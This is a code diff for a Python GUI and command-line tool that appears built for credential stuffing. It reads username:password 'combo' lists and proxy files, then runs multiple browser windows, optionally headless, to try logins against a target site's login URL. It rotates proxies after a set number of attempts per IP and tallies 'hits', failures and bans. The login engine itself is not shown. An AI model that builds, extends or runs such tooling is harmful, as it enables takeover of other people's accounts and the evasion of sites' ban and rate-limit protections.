+        r2 = ctk.CTkFrame(top, fg_color="transparent")
+        r2.pack(fill="x", padx=10, pady=4)
+        ctk.CTkLabel(r2, text="窗口数:").pack(side="left")
+        self.workers_var = ctk.StringVar(value="3")
+        ctk.CTkEntry(r2, textvariable=self.workers_var, width=40).pack(side="left", padx=(5, 15))
+        ctk.CTkLabel(r2, text="每IP条数:").pack(side="left")
+        self.per_ip_var = ctk.StringVar(value="30")
+        ctk.CTkEntry(r2, textvariable=self.per_ip_var, width=40).pack(side="left", padx=(5, 15))
+        self.headless_var = ctk.BooleanVar(value=False)
+        ctk.CTkCheckBox(r2, text="无头模式(省内存)", variable=self.headless_var).pack(side="left", padx=15)
 
-        ctk.CTkLabel(row1, text="Combo文件:").pack(side="left", padx=(0, 5))
-        self.combo_path_var = ctk.StringVar(value="combo_f.txt")
-        ctk.CTkEntry(row1, textvariable=self.combo_path_var, width=250).pack(side="left", padx=(0, 5))
-        ctk.CTkButton(row1, text="浏览", width=60, command=self._browse_combo).pack(side="left")
+        # Row 3: 按钮
+        r3 = ctk.CTkFrame(top, fg_color="transparent")
+        r3.pack(fill="x", padx=10, pady=4)
+        self.btn_start = ctk.CTkButton(r3, text="开始", width=90, fg_color="#4CAF50", command=self._start)
+        self.btn_start.pack(side="left", padx=5)
+        self.btn_stop = ctk.CTkButton(r3, text="停止", width=90, fg_color="#F44336", command=self._stop)
+        self.btn_stop.pack(side="left", padx=5)
+        self.status_lbl = ctk.CTkLabel(r3, text="就绪", text_color="#00E676", font=("", 13, "bold"))
+        self.status_lbl.pack(side="right", padx=10)
 
-        # 第二行：参数设置
-        row2 = ctk.CTkFrame(top_frame, fg_color="transparent")
-        row2.pack(fill="x", padx=10, pady=5)
-
-        ctk.CTkLabel(row2, text="并发数:").pack(side="left", padx=(0, 5))
-        self.threads_var = ctk.StringVar(value="3")
-        ctk.CTkEntry(row2, textvariable=self.threads_var, width=50).pack(side="left", padx=(0, 20))
-
-        ctk.CTkLabel(row2, text="每代理Combo数:").pack(side="left", padx=(0, 5))
-        self.per_proxy_var = ctk.StringVar(value="28")
-        ctk.CTkEntry(row2, textvariable=self.per_proxy_var, width=50).pack(side="left", padx=(0, 20))
-
-        ctk.CTkLabel(row2, text="登录URL:").pack(side="left", padx=(0, 5))
-        self.url_var = ctk.StringVar(value=HUAYUN_LOGIN_URL)
-        ctk.CTkEntry(row2, textvariable=self.url_var, width=300).pack(side="left")
-
-        # 第三行：操作按钮
-        row3 = ctk.CTkFrame(top_frame, fg_color="transparent")
-        row3.pack(fill="x", padx=10, pady=5)
-
-        self.btn_check_proxy = ctk.CTkButton(
-            row3, text="检测代理", width=100,
-            fg_color="#2196F3", command=self._check_proxies
-        )
-        self.btn_check_proxy.pack(side="left", padx=(0, 10))
-
-        self.btn_start = ctk.CTkButton(
-            row3, text="开始登录", width=100,
-            fg_color="#4CAF50", command=self._start_task
-        )
-        self.btn_start.pack(side="left", padx=(0, 10))
-
-        self.btn_pause = ctk.CTkButton(
-            row3, text="暂停", width=80,
-            fg_color="#FF9800", command=self._pause_task
-        )
-        self.btn_pause.pack(side="left", padx=(0, 10))
-
-        self.btn_stop = ctk.CTkButton(
-            row3, text="停止", width=80,
-            fg_color="#F44336", command=self._stop_task
-        )
-        self.btn_stop.pack(side="left", padx=(0, 10))
-
-        # 状态标签
-        self.status_label = ctk.CTkLabel(
-            row3, text="就绪", text_color="#00E676", font=("", 13, "bold")
-        )
-        self.status_label.pack(side="right", padx=10)
-
-        # ===== 中间信息面板 =====
-        info_frame = ctk.CTkFrame(self)
-        info_frame.pack(fill="x", padx=10, pady=5)
-
-        self.info_proxy = ctk.CTkLabel(info_frame, text="代理: 0/0 存活", font=("", 12))
-        self.info_proxy.pack(side="left", padx=15)
-
-        self.info_combo = ctk.CTkLabel(info_frame, text="Combo: 0 条", font=("", 12))
-        self.info_combo.pack(side="left", padx=15)
-
-        self.info_progress = ctk.CTkLabel(info_frame, text="进度: 0/0", font=("", 12))
-        self.info_progress.pack(side="left", padx=15)
-
-        self.info_success = ctk.CTkLabel(info_frame, text="成功: 0", text_color="#00E676", font=("", 12, "bold"))
-        self.info_success.pack(side="left", padx=15)
-
-        self.info_failed = ctk.CTkLabel(info_frame, text="失败: 0", text_color="#F44336", font=("", 12))
-        self.info_failed.pack(side="left", padx=15)
+        # 统计
+        info = ctk.CTkFrame(self)
+        info.pack(fill="x", padx=10, pady=5)
+        self.lbl_progress = ctk.CTkLabel(info, text="进度: 0/0")
+        self.lbl_progress.pack(side="left", padx=10)
+        self.lbl_hits = ctk.CTkLabel(info, text="击中: 0", text_color="#00E676", font=("", 12, "bold"))
+        self.lbl_hits.pack(side="left", padx=10)
+        self.lbl_failed = ctk.CTkLabel(info, text="失败: 0", text_color="#F44336")
+        self.lbl_failed.pack(side="left", padx=10)
+        self.lbl_bans = ctk.CTkLabel(info, text="封禁: 0", text_color="#FF9800")
+        self.lbl_bans.pack(side="left", padx=10)
 
         # 进度条
-        self.progress_bar = ctk.CTkProgressBar(self, height=8)
-        self.progress_bar.pack(fill="x", padx=10, pady=5)
-        self.progress_bar.set(0)
+        self.pbar = ctk.CTkProgressBar(self, height=8)
+        self.pbar.pack(fill="x", padx=10, pady=4)
+        self.pbar.set(0)
 
-        # ===== 日志区域 =====
-        log_frame = ctk.CTkFrame(self)
-        log_frame.pack(fill="both", expand=True, padx=10, pady=(5, 10))
+        # 日志
+        lf = ctk.CTkFrame(self)
+        lf.pack(fill="both", expand=True, padx=10, pady=(5, 10))
+        self.log_box = ctk.CTkTextbox(lf, font=("Consolas", 11))
+        self.log_box.pack(fill="both", expand=True, padx=5, pady=5)
 
-        self.log_text = ctk.CTkTextbox(log_frame, font=("Consolas", 11), wrap="word")
-        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)
+        # 定时刷新统计
+        self._refresh_stats()
 
-    # ===== 文件浏览 =====
-    def _browse_proxy(self):
-        path = filedialog.askopenfilename(
-            title="选择代理文件",
-            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
-        )
-        if path:
-            self.proxy_path_var.set(path)
+    def _pick_proxy(self):
+        p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
+        if p: self.proxy_var.set(p)
 
-    def _browse_combo(self):
-        path = filedialog.askopenfilename(
-            title="选择Combo文件",
-            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
-        )
-        if path:
-            self.combo_path_var.set(path)
+    def _pick_combo(self):
+        p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
+        if p: self.combo_var.set(p)
 
-    # ===== 日志输出 =====
-    def _log(self, msg: str):
-        """线程安全的日志输出"""
-        def _append():
-            self.log_text.insert("end", msg + "\n")
-            self.log_text.see("end")
-        self.after(0, _append)
+    def _log(self, msg):
+        def _do():
+            self.log_box.insert("end", msg + "\n")
+            self.log_box.see("end")
+        self.after(0, _do)
 
-    # ===== 代理检测 =====
-    def _check_proxies(self):
-        filepath = self.proxy_path_var.get()
-        if not filepath:
-            messagebox.showwarning("提示", "请先选择代理文件")
-            return
+    def _refresh_stats(self):
+        if self.engine:
+            s = self.engine.stats
+            total = s["total"]
+            done = s["processed"]
+            self.lbl_progress.configure(text=f"进度: {done}/{total}")
+            self.lbl_hits.configure(text=f"击中: {s['hits']}")
+            self.lbl_failed.configure(text=f"失败: {s['failed']}")
+            self.lbl_bans.configure(text=f"封禁: {s['bans']}")
+            if total > 0:
+                self.pbar.set(done / total)
+        self.after(1000, self._refresh_stats)
 
-        self.proxies = load_proxies_from_file(filepath)
+    def _start(self):
+        # 加载代理
+        self.proxies = load_proxies_from_file(self.proxy_var.get())
         if not self.proxies:
-            messagebox.showwarning("提示", "代理文件为空或格式错误")
+            messagebox.showwarning("提示", "代理文件为空")
             return
 
-        self._log(f"[代理] 加载 {len(self.proxies)} 个代理，开始检测...")
-        self.btn_check_proxy.configure(state="disabled", text="检测中...")
-        self.status_label.configure(text="代理检测中...", text_color="#FFEB3B")
-
-        def run_check():
-            checked_count = [0]
-
-            def on_check(proxy, idx, total):
-                checked_count[0] += 1
-                status = "✓" if proxy.alive else "✗"
-                self._log(f"  [{checked_count[0]}/{total}] {proxy.to_url()} {status}")
-
-            self.alive_proxies = check_proxies_batch(
-                self.proxies, max_workers=20, timeout=CHECK_TIMEOUT, callback=on_check
-            )
-
-            def update_ui():
-                self.info_proxy.configure(
-                    text=f"代理: {len(self.alive_proxies)}/{len(self.proxies)} 存活"
-                )
-                self.btn_check_proxy.configure(state="normal", text="检测代理")
-                self.status_label.configure(text="代理检测完成", text_color="#00E676")
-                self._log(f"[代理] 检测完成: {len(self.alive_proxies)}/{len(self.proxies)} 存活")
-
-            self.after(0, update_ui)
-
-        threading.Thread(target=run_check, daemon=True).start()
-
-    # ===== 开始任务 =====
-    def _start_task(self):
-        # 加载 combo
-        combo_path = self.combo_path_var.get()
-        self.combos = load_combo_file(combo_path)
-        if not self.combos:
-            messagebox.showwarning("提示", "Combo文件为空或路径无效")
+        # 加载combo
+        combo_path = self.combo_var.get()
+        raw_combos = []
+        try:
+            content = None
+            for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
+                try:
+                    with open(combo_path, "r", encoding=enc) as f:
+                        content = f.read()
+                    break
+                except (UnicodeDecodeError, UnicodeError):
+                    continue
+            if content:
+                for line in content.splitlines():
+                    line = line.strip()
+                    if line and ":" in line:
+                        parts = line.split(":", 1)
+                        raw_combos.append((parts[0].strip(), parts[1].strip()))
+        except Exception as e:
+            messagebox.showwarning("错误", f"加载combo失败: {e}")
             return
 
-        # 检查代理
-        if not self.alive_proxies:
-            if self.proxies:
-                answer = messagebox.askyesno("提示", "没有检测过代理存活，是否使用全部代理？")
-                if answer:
-                    self.alive_proxies = self.proxies
-                else:
-                    return
-            else:
-                # 尝试加载
-                filepath = self.proxy_path_var.get()
-                self.proxies = load_proxies_from_file(filepath)
-                if self.proxies:
-                    self.alive_proxies = self.proxies
-                    self._log("[提示] 未检测代理，使用全部代理")
-                else:
-                    messagebox.showwarning("提示", "没有可用代理")
-                    return
+        if not raw_combos:
+            messagebox.showwarning("提示", "Combo文件为空")
+            return
 
-        # 参数
-        try:
-            max_threads = int(self.threads_var.get())
-        except ValueError:
-            max_threads = MAX_THREADS
+        self.combos = raw_combos
+        workers = int(self.workers_var.get() or 3)
+        per_ip = int(self.per_ip_var.get() or 30)
 
-        try:
-            per_proxy = int(self.per_proxy_var.get())
-        except ValueError:
-            per_proxy = COMBO_PER_PROXY
+        global COMBO_PER_IP
+        COMBO_PER_IP = per_ip
 
-        # 更新 URL
-        global HUAYUN_LOGIN_URL
-        HUAYUN_LOGIN_URL = self.url_var.get()
-
-        self.info_combo.configure(text=f"Combo: {len(self.combos)} 条")
-        self._log(f"\n[开始] Combo: {len(self.combos)} 条 | 代理: {len(self.alive_proxies)} 个 | 并发: {max_threads}")
-
-        # 创建引擎
-        self.engine = TaskEngine(
-            proxies=self.alive_proxies,
-            combos=self.combos,
-            max_threads=max_threads,
-            combo_per_proxy=per_proxy,
-            log_callback=self._log,
-            progress_callback=self._on_progress,
-            result_callback=self._on_result
-        )
-
+        self._log(f"[启动] 代理:{len(self.proxies)} | Combo:{len(self.combos)} | 窗口:{workers}")
+        self.status_lbl.configure(text="运行中", text_color="#00E676")
         self.btn_start.configure(state="disabled")
-        self.status_label.configure(text="运行中...", text_color="#00E676")
 
-        # 在线程中启动引擎
+        self.engine = MultiWindowEngine(
+            proxies=self.proxies,
+            combos=self.combos,
+            max_workers=workers,
+            combo_per_ip=per_ip,
+            headless=self.headless_var.get(),
+            log_func=self._log
+        )
         threading.Thread(target=self.engine.start, daemon=True).start()
 
-    def _on_progress(self, current, total):
-        """进度更新回调"""
-        def update():
-            if total > 0:
-                self.progress_bar.set(current / total)
-            self.info_progress.configure(text=f"进度: {current}/{total}")
-        self.after(0, update)
-
-    def _on_result(self, result):
-        """结果更新回调"""
-        def update():
-            if self.engine:
-                self.info_success.configure(text=f"成功: {self.engine.success_count}")
-                self.info_failed.configure(text=f"失败: {self.engine.failed_count}")
-        self.after(0, update)
-
-    # ===== 暂停 =====
-    def _pause_task(self):
-        if self.engine and self.engine.running:
-            self.engine.pause()
-            if self.engine.paused:
-                self.btn_pause.configure(text="恢复")
-                self.status_label.configure(text="已暂停", text_color="#FF9800")
-            else:
-                self.btn_pause.configure(text="暂停")
-                self.status_label.configure(text="运行中...", text_color="#00E676")
-
-    # ===== 停止 =====
-    def _stop_task(self):
+    def _stop(self):
         if self.engine:
             self.engine.stop()
-            self.btn_start.configure(state="normal")
-            self.status_label.configure(text="已停止", text_color="#F44336")
-            self._log("[停止] 任务已手动停止")
+        self.status_lbl.configure(text="已停止", text_color="#F44336")
+        self.btn_start.configure(state="normal")
+        self._log("[停止] 手动停止")
+
+
+# ============================================================
+# 命令行模式（无GUI时使用）
+# ============================================================
+def run_cli():
+    print(BANNER)
+
+    # 加载代理
+    proxy_file = PROXY_FILE if os.path.exists(PROXY_FILE) else "proxies.txt"
+    proxies = load_proxies_from_file(proxy_file)
+    if not proxies:
+        print(f"[!] 代理文件为空: {proxy_file}")
+        sys.exit(1)
+    print(f"[+] 代理: {len(proxies)} 个")
+
+    # 加载combo
+    if not os.path.exists(COMBO_FILE):
+        print(f"[!] combo文件不存在: {COMBO_FILE}")
+        sys.exit(1)
+
+    combos = []
+    with open(COMBO_FILE, "r", encoding="utf-8") as f:
+        for line in f:
+            line = line.strip()
+            if line and ":" in line:
+                parts = line.split(":", 1)
+                combos.append((parts[0].strip(), parts[1].strip()))
+
+    if not combos:
+        print("[!] combo为空")
+        sys.exit(1)
+
+    print(f"[+] Combo: {len(combos)} 条")
+
+    workers = int(input(f"并发窗口数 (默认{MAX_WORKERS}): ").strip() or MAX_WORKERS)
+    headless = input("无头模式? (y/N): ").strip().lower() == "y"
+
+    engine = MultiWindowEngine(
+        proxies=proxies,
+        combos=combos,
+        max_workers=workers,
+        headless=headless
+    )
+    engine.start()
+
+    # 等待完成
+    try:
+        while engine.running:
+            time.sleep(5)
+            s = engine.stats
+            print(f"  [进度:{s['processed']}/{s['total']} 击中:{s['hits']} 失败:{s['failed']} 封:{s['bans']}]")
+    except KeyboardInterrupt:
+        engine.stop()
+        print("\n[!] 手动停止")
 
 
 # ============================================================
 # 入口
 # ============================================================
 if __name__ == "__main__":
-    app = HuaYunLoginApp()
-    app.mainloop()
+    if HAS_GUI and "--cli" not in sys.argv:
+        app = FlowerLoginApp()
+        app.mainloop()
+    else:
+        run_cli()
